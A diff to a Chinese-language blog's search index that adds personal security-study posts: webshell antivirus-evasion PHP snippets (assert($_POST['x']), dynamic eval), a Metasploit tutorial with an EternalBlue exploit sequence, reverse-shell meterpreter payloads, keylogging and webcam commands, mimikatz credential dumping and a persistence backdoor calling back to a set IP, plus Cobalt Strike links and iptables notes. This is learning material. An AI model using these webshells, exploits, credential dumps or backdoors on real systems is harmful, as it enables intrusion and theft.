@@ -1,6 +1,217 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>webshell免杀</title>
+    <url>/2022/04/27/webshell%E5%85%8D%E6%9D%80/</url>
+    <content><![CDATA[<p>代码执行与命令执行：</p>
+<p>代码执行： 可以用来执行代码的函数，参数是代码。例如<code>eval()</code></p>
+<p>命令执行： 可以用来执行命令的函数，参数是命令。例如<code>system()</code></p>
+<h1 id="动态执行"><a class="markdownIt-Anchor" href="#动态执行"></a> 动态执行</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert($_POST[<span class="string">'x'</span>]);</span><br><span class="line"></span><br><span class="line">$e = <span class="string">'assert'</span>;  <span class="comment">//eval不行</span></span><br><span class="line">$e(<span class="string">"phpinfo();"</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="string">'system'</span>;  </span><br><span class="line">$a(<span class="string">"phpinfo();"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>php函数调用的对象必须是一个函数，但不包括<code>eval</code>，<code>eval</code>在php底层不是一个函数，<code>assert</code>是</p>
+<h1 id="回调函数"><a class="markdownIt-Anchor" href="#回调函数"></a> 回调函数</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="变量掺杂"><a class="markdownIt-Anchor" href="#变量掺杂"></a> 变量掺杂</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$z = <span class="string">'test'</span>;</span><br><span class="line">$$z = $_POST[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">''</span>,$test);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="二维数组"><a class="markdownIt-Anchor" href="#二维数组"></a> 二维数组</h1>
+<h1 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过"></a> 编码绕过</h1>
+<h1 id="无字母的马"><a class="markdownIt-Anchor" href="#无字母的马"></a> 无字母的马</h1>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>免杀</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cobalt Strike使用</title>
+    <url>/2022/04/26/Cobalt-Strike%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<hr>
+<p><a href="https://johnfrod.top/%E5%B7%A5%E5%85%B7/cobalt-strike%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/" target="_blank" rel="noopener">Cobalt Strike基础教程</a></p>
+<p><a href="https://www.cnblogs.com/ta1zi/p/14677758.html" target="_blank" rel="noopener">Cobalt Strike使用教程一</a></p>
+<hr>
+<p><a href="https://zhuanlan.zhihu.com/p/359251293" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/359251293</a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>安全工具</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MSF使用</title>
+    <url>/2022/04/26/MSF%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="基础使用"><a class="markdownIt-Anchor" href="#基础使用"></a> 基础使用</h1>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole										    # 进入框架</span><br><span class="line">search  ms17_010                                    # 使用search命令查找相关漏洞</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块</span><br><span class="line">info     										    # 使用info查看模块信息</span><br><span class="line">show targets  										# 显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统</span><br><span class="line">show payloads										# 查看可用的payload，默认reverse_tcp</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp    	# 设置payload</span><br><span class="line">show options    									# 查看模块需要配置的参数</span><br><span class="line">set  RHOST  192.168.100.158    					    # 设置参数</span><br><span class="line">exploit / run     								    # 攻击</span><br><span class="line">后渗透阶段											 # 后渗透阶段</span><br></pre></td></tr></table></figure>
+<p>Metasploit框架将攻击与成功利用后执行的内容（payload）分离开来。Metasploit框架中的payload也分为两部分，即stager和stage。stager负责下载大型payload（stage），将其注入内存，并将执行动作传递给它。</p>
+<p><img alt="img" data-src="/2022/04/26/MSF使用/v2-3bf4cd7126559a01b348ceb1b7d58508_720w.jpg" class="lozad"></p>
+<h2 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload</h2>
+<p>简单来说，Payload是黑客用来与被黑了的系统交互的简单脚本。使用payload，可以将数据传输到已经沦陷的系统。Metasploit中的 Payload 模块主要有以下三种类型：</p>
+<pre><code>Single：
+  是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似netcat这样的非metasploit处理工具所捕捉到。Singles非常小，旨在建立某种通讯，然后进入下一阶段。例如，只是创建一个用户。
+
+Stager：ed
+  这种Payload 负责建立目标用户与攻击者之间的网络连接，是一种攻击者用来将更大的文件上传到沦陷的系统的payload。
+  一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条 tcp 连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。
+
+Stage：
+  是由Stagers下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制，如Meterpreter和VNCInjection。
+</code></pre>
+<p><strong>HowPayloads Work</strong></p>
+<p>payload模块位于<code>modules/payloads/{singles,stages,stagers}/&lt;platform&gt;</code></p>
+<p>当框架启动时，stages与stagers结合以创建可在漏洞利用中使用的完整的payload。然后，handlers与payload配对，因此框架将知道如何使用给定的通信机制创建会话。</p>
+<p>Staged payloads：<code>&lt;platform&gt;/ [arch] / &lt;stage&gt; / &lt;stager&gt;</code></p>
+<p>Single payloads：<code>&lt;platform&gt;/ [arch] / &lt;single&gt;</code></p>
+<p>这会产生像<code>windows/ x64 / meterpreter / reverse_tcp</code>这样的payload。平台是windows，架构是x64，我们提供的最终的stage是<code>meterpreter</code>，而传递它的stager是<code>reverse_tcp</code>。</p>
+<blockquote>
+<p>请注意，arch是可选的，因为在某些情况下，它是不必要或者已经默认了。比如php/ meterpreter / reverse_tcp。PHP的payload不需要Arch，因为我们提供的是解释代码而不是二进制代码。</p>
+</blockquote>
+<p>当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表：</p>
+<blockquote>
+<p>注：<br>
+  在这个列表中，像 windows/powershell_bind_tcp 就是一个Single Payload，它不包含Stage Payload。<br>
+  而windows/meterpreter/reverse_tcp 则由一个Stage Payload（meterpreter）和 一个Stager Payload（reverse_tcp组成。</p>
+</blockquote>
+<p>Stager中几种常见的payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp       #正向连接</span><br><span class="line">windows/meterpreter/reverse_tcp    #反向连接，常用</span><br><span class="line">windows/meterpreter/reverse_http   #通过监听80端口反向连接</span><br><span class="line">windows/meterpreter/reverse_https  #通过监听443端口反向连接</span><br></pre></td></tr></table></figure>
+<p><strong>正向连接使用场景：</strong><br>
+  我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了。</p>
+<p><strong>反向连接使用场景：</strong><br>
+  我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。</p>
+<p><strong>反向连接80和443端口使用场景：</strong><br>
+  被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信。</p>
+<h2 id="meterpreter"><a class="markdownIt-Anchor" href="#meterpreter"></a> Meterpreter：</h2>
+<p>Meterpreter属于stage payload，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。</p>
+<h3 id="meterpreter是如何工作的"><a class="markdownIt-Anchor" href="#meterpreter是如何工作的"></a> Meterpreter是如何工作的？：</h3>
+<p>首先目标先要执行初始的溢出漏洞会话连接，可能是 bind正向连接，或者反弹 reverse 连接。反射连接的时候加载dll链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS/1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS/1.0进行数据传输。</p>
+<h3 id="meterpreter的特点"><a class="markdownIt-Anchor" href="#meterpreter的特点"></a> Meterpreter的特点：</h3>
+<p>Meterpreter完全驻留在内存，没有写入到磁盘。<br>
+Meterpreter注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。<br>
+默认情况下， Meterpreter的通信是加密的，所以很安全。<br>
+扩展性，许多新的特征模块可以被加载。<br>
+在设置payloads 时，可以将payloads设置为：<code>windows/meterpreter/reverse_tcp</code> ，然后获得了<code>meterpreter&gt;</code>就可以干很多事了。</p>
+<h1 id="后渗透"><a class="markdownIt-Anchor" href="#后渗透"></a> 后渗透</h1>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line">bg                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line">exit                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line">help                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line">read                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line">sleep                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           将文件内容读到屏幕上</span><br><span class="line">cd                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line">cp                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line">dir                           列出文件（ls 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line">ls                            列出文件</span><br><span class="line">mkdir                         制作目录</span><br><span class="line">mv                            将源移动到目标</span><br><span class="line">pwd                           打印工作目录</span><br><span class="line">rm                            删除指定文件</span><br><span class="line">rmdir                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line">kill                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line">suspend                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<h2 id="抓取密码"><a class="markdownIt-Anchor" href="#抓取密码"></a> 抓取密码</h2>
+<h4 id="kiwi模块简介"><a class="markdownIt-Anchor" href="#kiwi模块简介"></a> kiwi模块简介：</h4>
+<p>​	mimikatz模块已经合并为kiwi模块；使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。</p>
+<h4 id="前提"><a class="markdownIt-Anchor" href="#前提"></a> 前提：</h4>
+<p>1. 提权到system权限：<br>
+1.1 提到system有两个方法：</p>
+<pre><code>  一是当前的权限是administrator用户；
+  二是利用其它手段先提权到administrator用户。然后administrator用户可以直接在meterpreter_shell中使用命令getsystem提权到system权限。
+</code></pre>
+<p>​		1.2 进行提权：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getuid      #查看当前会话用户身份</span><br><span class="line">getsystem   #自动尝试提权</span><br></pre></td></tr></table></figure>
+<p>2. 进程迁移：</p>
+<pre><code>  kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。
+      所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。
+</code></pre>
+<p>1、查看当前系统信息，可以看出目标系统是64位的：<br>
+命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysinfo #查看当前系统信息</span><br></pre></td></tr></table></figure>
+<p>2、查看进程信息：<br>
+命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps  #查看进程</span><br></pre></td></tr></table></figure>
+<p>3、把进程迁移到PID为504这个程序中(因为当前用户)：<br>
+注：因为目标系统是64位的所以需要把meterpreter进程迁移到一个64位程序的进程中。<br>
+命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">migrate [PID]</span><br></pre></td></tr></table></figure>
+<p>三、kiwi模块的使用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load kiwi #加载kiwi模块</span><br><span class="line">help kiwi #查看kiwi模块的使用</span><br></pre></td></tr></table></figure>
+<p>一些有关密码和凭据的命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">creds_all：             #列举所有凭据</span><br><span class="line">creds_kerberos：        #列举所有kerberos凭据</span><br><span class="line">creds_msv：             #列举所有msv凭据</span><br><span class="line">creds_ssp：             #列举所有ssp凭据</span><br><span class="line">creds_tspkg：           #列举所有tspkg凭据</span><br><span class="line">creds_wdigest：         #列举所有wdigest凭据</span><br><span class="line">dcsync：                #通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：           #通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：  #创建黄金票据</span><br><span class="line">kerberos_ticket_list：  #列举kerberos票据</span><br><span class="line">kerberos_ticket_purge： #清除kerberos票据</span><br><span class="line">kerberos_ticket_use：   #使用kerberos票据</span><br><span class="line">kiwi_cmd：              #执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：          #dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：      #dump出lsa的密文</span><br><span class="line">password_change：       #修改密码</span><br><span class="line">wifi_list：             #列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：      #列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure>
+<p>1. creds_all：</p>
+<p>该命令可以列举系统中的明文密码:<br>
+命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">creds_all  #列举所有凭据</span><br></pre></td></tr></table></figure>
+<p>2. kiwi_cmd：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令:</span><br><span class="line"></span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<h2 id="生成持续性后门"><a class="markdownIt-Anchor" href="#生成持续性后门"></a> 生成持续性后门</h2>
+<p>因为 meterpreter  是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用  meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。</p>
+<p>建立持续性后门有两种方法，一种是通过<strong>启动项启动</strong>(persistence) ，一种是通过 <strong>服务启动</strong>(metsvc)</p>
+<h3 id="启动项启动"><a class="markdownIt-Anchor" href="#启动项启动"></a> 启动项启动</h3>
+<p>启动项启动的话，我们先生成一个后门工具，传送门——&gt; <a href="https://wangjun.dev/2016/04/metasploit-generate-backdoor/" target="_blank" rel="noopener">使用msfvenom生成多平台后门木马</a></p>
+<p>然后放到windows的启动目录中：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+<p>这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。</p>
+<h3 id="服务启动"><a class="markdownIt-Anchor" href="#服务启动"></a> 服务启动</h3>
+<p>通过服务启动，我们可以运行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27  #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line"></span><br><span class="line">#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span><br></pre></td></tr></table></figure>
+<hr>
+<p><a href="https://zhuanlan.zhihu.com/p/61412226" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/61412226</a></p>
+<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45588247/article/details/119614618</a></p>
+<p><a href="https://www.cnblogs.com/zw1sh/p/13194235.html" target="_blank" rel="noopener">meterpreter后渗透攻击部分命令</a></p>
+<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119497964?spm=1001.2014.3001.5501" target="_blank" rel="noopener">MSF中kiwi(mimikatz)模块的使用</a></p>
+<p><a href="https://www.anquanke.com/post/id/235631#h3-28" target="_blank" rel="noopener">https://www.anquanke.com/post/id/235631#h3-28</a></p>
+<p><a href="https://wangjun.dev/2016/04/metasploit-generate-backdoor/" target="_blank" rel="noopener">https://wangjun.dev/2016/04/metasploit-generate-backdoor/</a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>安全工具</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>iptables实战</title>
+    <url>/2022/04/25/iptables%E5%AE%9E%E6%88%98/</url>
+    <content><![CDATA[<h1 id="iptables-匹配规则"><a class="markdownIt-Anchor" href="#iptables-匹配规则"></a> iptables 匹配规则：</h1>
+<ul>
+<li>
+<p><code>[-i|o 网卡名称]</code>：i是指定数据包从哪块网卡进入，o是指定数据包从哪块网卡输出</p>
+</li>
+<li>
+<p><code>[-p 协议类型]</code>：可以指定规则应用的协议，包含tcp、udp和icmp等</p>
+</li>
+<li>
+<p><code>[-s 源IP地址]</code>：源主机的IP地址或子网地址</p>
+</li>
+<li>
+<p><code>[--sport 源端口号]</code>：数据包的IP的源端口号</p>
+</li>
+<li>
+<p><code>[-d目标IP地址]</code>：目标主机的IP地址或子网地址</p>
+</li>
+<li>
+<p><code>[--dport目标端口号]</code>：数据包的IP的目标端口号</p>
+</li>
+<li>
+<p><code>m</code>：extend matches，这个选项用于提供更多的匹配参数，如：</p>
+<ul>
+<li>-m state --state ESTABLISHED,RELATED</li>
+<li>-m tcp --dport 22</li>
+<li>-m multiport --dports 80,8080</li>
+<li>-m icmp --icmp-type 8</li>
+</ul>
+</li>
+<li>
+<p><code>&lt;-j 动作&gt;</code>：处理数据包的动作，包括ACCEPT、DROP、REJECT等</p>
+</li>
+</ul>
+<p>具体实例参考 <a href="http://seanlook.com/2014/02/26/iptables-example/" target="_blank" rel="noopener">iptables常用实例备查</a>。</p>
+<h1 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h1>
+<p><img alt="image-20220425120110607" data-src="/2022/04/25/iptables实战/image-20220425120110607.png" class="lozad"></p>
+<h1 id="1"><a class="markdownIt-Anchor" href="#1"></a> 1</h1>
+<p>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
+<p>安全日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
+<p>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.ev</code></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+        <category>防火墙</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>防火墙</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网关为0.0.0.0含义</title>
     <url>/2022/04/23/%E7%BD%91%E5%85%B3%E4%B8%BA0-0-0-0%E5%90%AB%E4%B9%89/</url>
     <content><![CDATA[<p>网关为<code>0.0.0.0</code> 或者<code>*</code> 表示表示此条路由<strong>不需要通过网关转发</strong>，目标地址和自己<strong>属于同一个二层网络</strong>，通过<code>ARP</code>协议获取目标的MAC地址后通信，比如一些虚拟网卡，不需要路由。</p>
@@ -529,6 +740,7 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+        <tag>防火墙</tag>
       </tags>
   </entry>
   <entry>
@@ -16595,8 +16807,8 @@ tty0、tty1、tty2等.当你在控制台上登录时，使用的是tty1.使用Al
         <category>Android</category>
       </categories>
       <tags>
-        <tag>Java</tag>
         <tag>Android</tag>
+        <tag>Java</tag>
         <tag>学习</tag>
       </tags>
   </entry>
